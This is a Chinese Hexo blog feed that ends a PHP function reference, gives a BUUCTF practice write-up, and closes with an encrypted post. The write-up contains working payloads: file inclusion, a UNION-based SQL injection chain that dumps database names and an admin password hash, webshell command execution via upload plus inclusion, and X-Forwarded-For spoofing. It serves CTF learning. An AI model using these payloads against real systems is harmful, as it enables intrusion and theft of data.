Unix<br>命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 <span class="hljs-built_in">exec</span>() 或 <span class="hljs-built_in">system</span>() 函数<br></code></pre></td></tr></table></figure><h2 id="反序列化函数"><a href="#反序列化函数" class="headerlink" title="反序列化函数"></a>反序列化函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">unserialize</span>(): 将一个已序列化的字符串转换回 PHP 的值。例如：<span class="hljs-variable">$array</span> = <span class="hljs-built_in">unserialize</span>(<span class="hljs-variable">$serializedStr</span>); 可以将一个序列化的数组字符串转换为数组。<br></code></pre></td></tr></table></figure><h2 id="数据库操作函数"><a href="#数据库操作函数" class="headerlink" title="数据库操作函数"></a>数据库操作函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">mysql_query</span>(), <span class="hljs-built_in">mysqli_query</span>(): 发送一个 MySQL 查询。例如：<span class="hljs-variable">$result</span> = <span class="hljs-built_in">mysql_query</span>(<span class="hljs-string">&quot;SELECT * FROM users&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="正则表达式函数"><a href="#正则表达式函数" class="headerlink" title="正则表达式函数"></a>正则表达式函数</h2><p><strong>preg_match():</strong></p><p>用于进行正则表达式匹配，成功返回 1，否则返回 0。</p><p>注: <code>preg_match() </code>第一次匹配成功后就会停止匹配，如果要实现全部结果的匹配，即搜索到检索对象的结尾处，则需使用 <code>preg_match_all()</code> 函数。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>, <span class="hljs-string">&quot;PHP is the web scripting language of choice.&quot;</span>, <span class="hljs-variable">$matches</span>))<br>   &#123;<br>      <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;A match was found:&quot;</span>. <span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>]; <br>   &#125; <br>   <span class="hljs-keyword">else</span><br>   &#123;<br>      <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;A match was not found.&quot;</span>; <br>   &#125; <br><span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">//A match was found: PHP </span><br></code></pre></td></tr></table></figure><p><strong>preg_match_all():</strong> </p><p>用于进行正则表达式全局匹配，成功返回整个模式匹配的次数（可能为零），如果出错返回 FALSE 。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>   <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;&lt;pre&gt;学习php是一件快乐的事。&lt;/pre&gt;&lt;pre&gt;所有的 phper 需要共同努力！&lt;/pre&gt;&quot;</span>; <br>   <span class="hljs-variable">$kw</span> = <span class="hljs-string">&quot;php&quot;</span>; <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/&lt;pre&gt;([sS]*?)&lt;/pre&gt;/&#x27;</span>,<span class="hljs-variable">$str</span>,<span class="hljs-variable">$mat</span>); <br>   <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>]);<span class="hljs-variable">$i</span>++)<br>   &#123;<br>      <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$mat</span>[<span class="hljs-number">1</span>][<span class="hljs-variable">$i</span>]; <br>      <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$kw</span>, <span class="hljs-string">&#x27;&lt;span style=&quot;color:#ff0000&quot;&gt;&#x27;</span>.<span class="hljs-variable">$kw</span>.<span class="hljs-string">&#x27;&lt;/span&gt;&#x27;</span>, <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>]); <br>      <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$mat</span>[<span class="hljs-number">1</span>][<span class="hljs-variable">$i</span>], <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>], <span class="hljs-variable">$str</span>); <br>   &#125; <br>   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>; <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//将所有 &lt;pre&gt;&lt;/pre&gt; 标签内的关键字显示为红色</span><br></code></pre></td></tr></table></figure><p><strong>preg_match_all()</strong></p><p>用于进行正则表达式全局匹配，成功返回整个模式匹配的次数（可能为零），如果出错返回 FALSE 。</p><p><strong>preg_replace()</strong></p><p> 执行正则表达式搜索和替换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;butt3rf1y&quot;</span>;<br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/\d+/&#x27;</span>;<span class="hljs-comment">// \d+是匹配一个或多个数字</span><br><span class="hljs-variable">$replacement</span> = <span class="hljs-string">&#x27;R&#x27;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>; <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// buttRrfRy</span><br></code></pre></td></tr></table></figure><p><strong>preg_split()</strong></p><p>将字符串依指定的规则切开。</p><h1 id="表单数据"><a href="#表单数据" class="headerlink" title="表单数据"></a>表单数据</h1><p><strong>$_GET</strong></p><p>接受 GET 请求传递的参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">example.com/index.php?<span class="hljs-attribute">bu</span>=butt3rf1y，你可以使用 <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bu&#x27;</span>] 来获取相应的值<br></code></pre></td></tr></table></figure><p><strong>$_POST</strong></p><p>接受 POST 传参</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">example.com/index.php 进行 POST 传参，参数名为 bu 内容为 but3rf1y，可以使用 <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bu&#x27;</span>] 来获取相应的值。<br></code></pre></td></tr></table></figure><p><strong>$_REQUEST</strong></p><p>接受 GET 和 POST 以及 Cookie 请求传递的参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">通过 <span class="hljs-built_in">GET</span> 请求 URL 传递了一个参数 example.com/index.php?<span class="hljs-attribute">key</span>=value_from_get，可以通过 <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] 获取这个值。<br>通过 POST 方法提交了一个表单，其中有一个名为 key 的字段且其值为 value_from_post，可以通过 <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] 获取这个值。<br>设置了一个名为 key 的 cookie，其值为 value_from_cookie,可以使用 <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] 来获取这个值。<br></code></pre></td></tr></table></figure><p>有点小累……</p>]]></content>
    
    
    <categories>
      
      <category>语言</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU Basic(1)</title>
    <link href="/2024/11/07/BUUBasic-1/"/>
    <url>/2024/11/07/BUUBasic-1/</url>
    
    <content type="html"><![CDATA[<p>BUU 做的几道题</p><span id="more"></span><h2 id="BUU-LFI-COURSE-1"><a href="#BUU-LFI-COURSE-1" class="headerlink" title="BUU LFI COURSE 1"></a>BUU LFI COURSE 1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>构造 payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">file</span>=/flag<br></code></pre></td></tr></table></figure><h2 id="BUU-SQL-COURSE-1"><a href="#BUU-SQL-COURSE-1" class="headerlink" title="BUU SQL COURSE 1"></a>BUU SQL COURSE 1</h2><p><img src="/SQL1.png"></p><p>点击 <code>测试新闻1</code> ，f12 查看状态，发现注入点，访问请求网址</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 正常回显<br><span class="hljs-attribute">1</span>=2 报错，说明有注入点<br></code></pre></td></tr></table></figure><p>构造 payload</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata),<span class="hljs-number">2</span>#<br>得到数据库：information_schema,performance_schema,ctftraining,mysql,test,news<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;news&#x27;</span>),<span class="hljs-number">2</span>#<br>得到数据库 news 下的表：<span class="hljs-keyword">admin</span>,contents<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctftraining&#x27;</span>),<span class="hljs-number">2</span>#<br>得到数据库 ctftraining 下的表：FLAG_TABLE,news,users<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;admin&#x27;</span>),<span class="hljs-number">2</span>#<br>得到 <span class="hljs-keyword">admin</span> 表下的列名：id,username,<span class="hljs-keyword">password</span><br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">2</span>#<br>得到 users 表下的列名：<span class="hljs-keyword">USER</span>,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,<span class="hljs-keyword">password</span>,ip,<span class="hljs-type">time</span><br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(username,&quot; &quot;,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>),<span class="hljs-number">2</span>#<br>得到 <span class="hljs-keyword">admin</span> 的数据：username=<span class="hljs-keyword">admin</span> <span class="hljs-keyword">password</span>=<span class="hljs-number">64</span>ebd6a0d676acff2c6bed36e716c9aa<br></code></pre></td></tr></table></figure><h2 id="BUU-UPLOAD-COURSE-1"><a href="#BUU-UPLOAD-COURSE-1" class="headerlink" title="BUU UPLOAD COURSE 1"></a>BUU UPLOAD COURSE 1</h2><p>文件上传，先上传一个一句话木马 11.php ，但是蚁剑连接不了，无论上传什么都会被解析成 <code>.jpg</code> 格式</p><p>后面才知道这有一个文件包含漏洞，文件上传和文件包含结合起来了。</p><p><code>http://4eb012d0-f5b1-4297-907d-54f47dfaddf1.node5.buuoj.cn:81/index.php?file=upload.php</code> 将 <code>upload.php</code> 换成上传的文件的路径，然后对其 post 传参 </p><p>payload：1 是一句话木马的连接密码</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">1</span>=system(<span class="hljs-string">&quot;ls /&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">1</span>=system(<span class="hljs-string">&quot;cat /flag&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="BUU-BURP-COURSE-1"><a href="#BUU-BURP-COURSE-1" class="headerlink" title="BUU BURP COURSE 1"></a>BUU BURP COURSE 1</h2><p>提示只能本地访问，所以bp 抓包进行 <code>X-Forwarded-For</code> 伪造</p><p>然后进行 post 传参</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=admin&amp;password=wwoj2wio2jw93ey43eiuwdjnewkndjlwe<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>BUUCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TestWP</title>
    <link href="/2024/11/06/TestWP/"/>
    <url>/2024/11/06/TestWP/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a826ef5974244763fa996854a6047201febeb2510035da1bd555baca5bd759a4">7f73ba022062642d898b5d3b104fc43ca083437efa339e34065fadf0421af949b4d2d043e740612ea7c4b9daae05f026e85f36c464e93978570b068cc9ac5dc92af79ebd543ee42c00b98503eae4b1824dd19dd77c11dab5f292b1e472f1c487a657ec6238bda106055641be67a181c4a4d1fb7c0350664ba8108c4fda3f8213ed7f8ab2d76bd04660ba9e7d307a41487164e344bbe81a72e00de462d643630adc8536d9cb68e85fdfb27e183d2095efdebf8fa560480055f69ed98cb32a3696f27d5f5f27cd783d7d88d21b0c5dd425f341f108f93a4341c669f841ba1f8a63c9ca40c53a76fcabfc38afee2d602dded350170e4aa4493d5e98ba9a4dfec2addc8095e24379a8b44385dc5d54e5e4a7292f217138ee115abb52616c5aea3d0f646e8c8c3bc99593f9c3ddbbfc06229314fa9b3e48610d9cfd6c8d7f9cd99d6b38a7dee540bd3521b9eb7f5d4c58ba194f43f63f40bac4d1620eb1213cac8401125d04fbd4f2e08b47a01a399b20f77346d20cbbc094c6c5917405717b011e59698d358f49383d69e30c428d6904f6a7b963b64c64de967987781083d0e8e30705f4081e3c66eaf5c7b122226f6ce93d9eb5c7bae63b1fe8eb9815b89e89193ac27ab64264ba9c07df2cf5d633765a1bd1bdbde233064873ebeb1ea19e60fe81facf907f67fae8b8e131d00762db36880257725fc6ff189379c6e647b92e3a73229c48d2525b8c96ee9e7a2937c1e6dde17f3cd3b30b624500420907e1139ba0c5220c2e7b6c8d8319729d91220870f31d90fe2fc7eb57f82df57f5c6c6b5b309db2a72ddf9d4ff4a6634aba46baef6c6123ebc649c5c3fa765bae44affaf7e7c8f8c4f10a94026a61a0bc51462c933ef81d2b24d7b530b61a1aea9ece9645ca0cab6e51e18f92dc3d5ed9305d5d9fbc6c3fb10dc3f96090e425f003bb20f73a85814baa199b0c8cc44ecc198ba4c685e7684f57fbe767b7a97fced65f8a365f5ac4a05e46833e7100ba94c9e81e972eafcb5e7701df46d804990b14937001f36a8005e2272ed8dc8503a6024c5da391b412f2d0370a65d6cfc49e952182caf8c3ae0b76ffbefa8bec208fa86ccd4d5d71efa617a04364c7177562e5f6b6186e163774b44fbab9bd0c277e65f2be3560a9f692b58f5a78ca8b09a82d9f4e3647b37c7119076679b82aab4aedaf609bddc2d1bf75922a39aaa97dd53714726c57996aef0b05337f651b97b38f9205fd4d15576a5125e2f721195f3263f12b8b1bcfe34910dffff4c5f8ba0edccc38307de3330bd9393c0675bb9b770d9471e0d36998d6d90f07365cbd4e0fb719cc539a7d0bb3b60a6e1a2da4e8b172a6b4b9a5b0b92df5168731e636b08879b51debbbb58df82fd457df8b2a9627fa0f1aaecd461d48fba2ae54dbc8aff8b063fb0ca7dd880b1f4f88f86c5abf32ba3d836b22f638aa37153f691a29e710c3ebeb50bf8f8ebd3af3c2bb6ea181a6745ea9a10f63be9cd76b7a6f7b8519de4bbcff569306fe69ddd4d32fdae153b561151bb388b6c0ff9dc1d008e1c2b45906b030a5101e0893df906b968825f1fdd9cbe1817ddc64bc239d9c123768cde2b50b84f943dc3390ed7928cef2253c4288f666a56d6a5240b1906690a77bd6cd4e9452b94f430de155cfcb7c3fd03697ac2f3b2d17e910d2fec2bf592e5f5378567c225f5bd430f2ef561eb7b3e6e6e0aad6df41950877eee1c7f657b464feebcd68e4e8c7c8439cf6343dceafe8d1784472d40fe6946fb4466e1ca36c944863be5aa72de813c3d01080c396f9f750a4fa9f952e809a03e6cbf8361f8109e4542704c277b20eb1b071a860159eaf5ada228beb9b8c461783ee2c1098cbc5714bbf4634ecf19276f0eb2b1893b608c1dd5a20472b562f2780f6735e4c5006d51bb7b27372fd94a0c54debbe303589d3837c62b5aa16a2c48c8ed622e612c038f8c8a1cb35e504cde6ab9a2205832d511ed4a3b7c4d929a06e464c98bb31e916ede2698c300702720c1984e6e4e8d28d5fef435353d5b300d4b6ab86a438d9cf7f5d2aec71f3260c9deb15e7c30c1cb890d0e1a8258440502345c25218d1f3dc98fd9fbcfe0e954825949af1346633f424236afe436369421399c421ed33926bcc01843b1429117f465b51982c0d06281b8a751211541a492e8c73f156acade5f14adbc6d3d6851d1c6484e57f766c66a57a40829c4ac9c060f2b66f17fc05e7a3710b5731c1fe718bf521839122ecbbfa3fe0767a83d2e31ecdb0fb319761e6e11c586902ee29cb828bd36f2f41a211126912a89cd8881e0fb58362c4b3a7c69d799e7b9c282dd1b3b090d725c5c023ed6c0f03cacb6a2803d2e813391e11af492895a1bbd55cd25f1ad25efe858e6af24eb3607a3449d7414e4258fe98cab1a1d260f3928cd253aecaf1c2fb8bdf3d846e9f5ddceb6846d516688c9072ccb92d27f74ad5a0a3b26ed7744ef633e3eb0c5b03a4884c3c5dbe8a7b21bc94f9144e174229b5a070d5497ac84937d34927c13b6f38fe72817c770a530ab035a9666a5214c44e2c091545e5884a519d588de36cff6b3195906be80d7aca3618ba7eade394c8c2d518b6b1937c0947681964dc11574d1925807fe83575f5a4d19be2827ff414a8e21400e330ecb6fc13ea86b61b09ce6f2b1fb29ca3afb57bdaf8a3494b1492d2144b84177405fe565f1220ac89a466d4aeacba6603c87c76cf9fc4e58b1577466dd13efb831efd80244eb17310d88c86866231a5bacf2420aef4a4e48afa54cb5a73d216e53c867c95ea5a9230fbb78e91f58b8846f15219b8e5e049c737b13d5bd7d673ff86994d4512a52e9bebdbfb4483e51c9bda1dadbe0a4e6b37c91ba4e6360470679149033a22500534bad9b7e69fca0b9644a51f33ed103f64c3b60bac16a5955ff2da39002a4913996af02e1276620ee9c774957ceb4185cdc066a7a2772e829fc9475b98290576102c8e1d565cb2c111b732b5117208de09532a22735f3826defc008c4b8d261c4744e96d61d4ede21a0e1f03370398271473e0a577136023049eaef69fef438ba7880022a7ddc37a92380aa1d4a7ba6e2005513f50493d5e8dac88726ed742e3e573fdbe0409bf5e7ffe06617b6e7baf7fb61cadcdc19c8d7bc71a0b31a238f173b36733d47a569cca34ae8d20cab978bdac002ed12ce834fd583bc75865277f01fe50bcf415a1fd7d1b29c597be58352b1f476b4a09259828487913addab29ad436143e5569484eca661396320999b858b94cf9a2b60ff9cf5dc67a1f6ed5eb9a984209ddaea9f7a692d9f1002a54080e4feb53a41830574a881fb97de7f45b3c7f48abf80bd88e7c1dda4839d678e4425749ba371414f4b669b5e2121eb1dce7b2341d0568f56dbe7aedc3053a0c26d3a52bcd3757835b72f4b6c8a208236a0e80df7c274973fb87ed4d7be9ed85b7beefa6683989f688dbda621af26ff939c1978254a3aad5cab7162d84cea0963299f56bc4e9b80f16193dc873763ed0ea66f34ed32ef6f1e411b8d6a59f5c32d5b159df9e7a954261c359d2fa5483a50ad03531f4a803d6d4ba54930dec5d13b75a1067a9bd75c54793dfc886a03fd1ff333e8a4ea1e8a662ef159f243cd63bae1c858bb0914108e8e68f9abeda31a27c9428517973a211c140321abd760f3b19928c528588a5c57a30518a2cf0ba64bfb513cdce59a61b5e3b03f541b3e7f0c9c8a8fd011b86321766d4368f2f62a11b4dabfc546f61badd537b2ead5643f61e65abd49a2e80df9a45d1d72673f3875d71f4a7bc12008f173de5a35b73009b6837b7bddfa851f938194f2911d0de8ca07f18c17d06ba3e6dc3f9f4c78a69047cb678807c88db5184f6eacf891d4e10d97e177bc9ee4ccf6f5bc48bfc3b9da081dc2328731f71d41ab117c81eafdae86a0a73a2585a93f6889dc57fcfbbc22bb6506f199c14ef4c072ea55d85bfdf200378a968c04d09e784e90f455e900d5175b4c4b569e7538431d2cd3bf96c2835cf3b239f5fcac0a6a53bb61ab679b1c7cf54ef42e4677d6f39fe3baacadcfc0e4dd6b460208ccf4d6d46fed03feb0807f7eb6dd5f48d7ad8369069d1689e1189282fbaa0d3226c606a6b8fad56201a60a9566ebc8b7b9ed494cfd4eebde5a94270240460b6014c0135d70cc164fd1a5a5450a92048f56297dc8392ee6c5737e8272421eff868dd6d62695d6e8f98e21d3bb4e2c19f4480b698ceb06ac58bb04756cf02decc4f50dddabd776da1675a55e74a35600b911e54ea0044697e9d1641c118aad00c1a0415221fabe9cf50d75e64a97cf2d4cba4c966bf043d76c11f02426a2f93bc295a0b9d42fdd3d9f1e299040bb66a2b32ca765eb464c1918aa57c8b630b304f5a38b634513cbafc371925ef78894ca7df298e8357306a5a1841f1c92a0dc8dab1ce40dc56959cf0701a8088ffc09cfe66f84522aca3695db2a98b520c6da131c9e1d511f17480c83f2c61fc7b99443cb2f1866c343936e4460d5aa9795c93c972c787d0b3307c4d629c6e88c6c0da0b30f020765c449282925ae11dc600fad2f68604aa010e0681fe95a9a4f8a5a96df94fd74a294f064c8be1e788c51f8e0b665ff600148017fb7b00a274ab457443f9a8563cc2694b9335e9f237c7a7c43f5a2e18ffe441567234affccac5a221e19ce4d38e675cc4d33c973d21fbbac68b366ef46ef0a165fb2c2aa6335b4e56ab5f03006c4561e9eb890aea40ff3a3093312a473b776a9e5282ad57858ec9bc3de5b4a38aeb19f50a799d9abb5462a9b6158265279f61e40bae49145fcbf270797d75e02c395d4a17214befb104706ff74326ddbb0ad43f109bf7689a7163292f662126c4324f1731b1c389efa717015225d5b4217499e7a3661ed89ca03df4872c5b15ac6e8a7053815d66992c2fce3433faf44103361f56c5d9abdeb8d0dd66578040e0a3a2050c5f5e605f08dc05442171929c9a7caaadc2c549e4c585cd0111c0af87c72ddc93b708fde85e4496799e1161da4e36483a8a3ca98cbd62555b4bf02a75d60e6b4d0818413f12d206281a6d6c25c7e4caed63d9aa3118b52acb3df142320515a35cf33a29b0eaec34229d5e750cfde451c84046807752eb8bab7757c335724a65be9ce37059d524b599a42178ee609224075edd7de42391b4cac152dcbc9340d6bc14763b49fb5e2bc875f558c424da71801cd6145959f6d0f2ce886554776ef44f8150a14ffdeb0ffb0be12fad2b4f2f8f621529a9d66bf2c57b7fc334491bc369508866bd98adb51180d6ddad14990faed51bb65a921e50de5b65d0e2e6932eab981483254d8917bf814c8282eed9daa8b3887d47a1d67c97aa35f7c4cf99d6e2695696def392de0e3d01e8828372c63881473243e26926e24185750efcc8bc855fd9ef3753de776a43e8e9acde542c6fdb37f1d888b40b94f90124e0ff7653873233605d2a9e99ba05b4f750c9d17b5e2b81a9b45ae9f83b96b7ddfbfdd71decae84ce72e20b8cd273b4c10f354e4b831b3dd73e58269d9c28354298555fc99e38b63fc1bfd33c791074f6c6afe4ae188e33f2f20d1c2c9494ae385e0d45a2d7462d30291c604d98eddf8e957c2b0badfadaabde49d861fcb0e8558ed7164bfd820075c005ee105e28846ac2574b1a64f318fa98b64e936aba5df76a950d7d309e363d1ec0a922e72eb76ab94900452116a19643aa053ba813cd56d7957179ad1c802f75504cd460972fcaf5a8356bdc996b1bd0a92f3c8187d93444624cccc1204cba54eb4b1bca22b22ea559965d47b0084e6c3574b854c357982ba0f7101e8d137131971b36f1d4b7d6112055e271f0645852e485eada154683100eab618dc0804d867dd8e0c6fb666725b5e926daf5ba7f9c23117f3afe79d1e665f660cab2468f5056a8e3990d1b8b7ea199101e6135e6eb3a208ac574434ff31ee14ed0b068974ae19a47ec4e98c428df80a0bb32c1dddb5c62d6ecd42093e6f99e9b200955c296203a4b82566ac272fa2e3daabae5516a1c4c4474d58d0ab10e909e0026631932939bd9ea560af3efafa1982f5a5c020db8827b6689a398149032b083c1d7e53e20b98a5082cb06d3720149267f2d36839221579fd7196871c4f577e062c80750f437bdfab903c2dc1588ea8b45227d89e46d28ee451f81664336c3d8c747f6d8908ddf73bcac792e35b9922242b6cf212350e918c9b9d6123d2ff82e0e1921e8f703bf18675260dd3e2183934e10506ed2cfbb99fb675f3cf6dfbdd6624aaeb4d54807f1e2ce7da06973151f08e5010d1189c995888ad54bdcddabac11b5dff0ef9b7aa557571dd2683ef9db7bb6c5e66afbc8f667ac876aa1e66f8016d7adb24d4415cb844535b42232175ceb68cde53469cf1af02c1dc2cb0edddc4fc44a3bf33108da82c9a2e7c7c2f0e78f113eb184ef250c3a0d9fa5989ea4ef8e6a6c1f6c8bd3f240e04ec7eb82c038f58aaa207b7cd970c8e08b607586cc01a890a15fdfea164091a4cdaab675a2fec3737fc15a51516fe32ef637b70d26d449132c4f4d22f04508b65767ef56f26c40daf17a2b3acf34e557014b7a383b4d10cf94c9e1ab71c77b0440cd38f7a1e8b5a14af5bbaac1eb09aae7aa76d523b3fbaab2e8f82c462082480a45ef5e43ca15be7ab1f35d2a5ef1b50457dcd4757d64d229b9aa97f1744493247fd0b66a15ecac63578404fdf8fc2a8512958b42888c0ea946eb6388715b058f9efdadc9f6eb6d10abe5ad8cc7df40d6a73e89e160f2c218d52ea7fff8b34047f67eef6a205f07c4134c146ba230d23436882a0f399cf2c5e84d5eeb3786aab404e40a1d3fc0e3d1cec3db45d2db6b720c93c1d720025dc533a49040f9b618277ed83f147481900f4e7de0c2ecabaf2bf992a39f1ae459411f98ef2dc933195dce8707d49f44b7fb9757383fd9fd6c05f8f2a530e00973bef8ce890620c242e741a6a3bacfd4bb5d04a6f897fc3f58236730c3e5087a9afa381c456fdb9ff30ffddb9227249f3a9c5249a2756ef516c62890fc9537f495b1b52acbf8ce470eadb4a8d3b33fa9d35cdd2ad4e9c77427822101cb872f9fec77eb0b9163f87005355c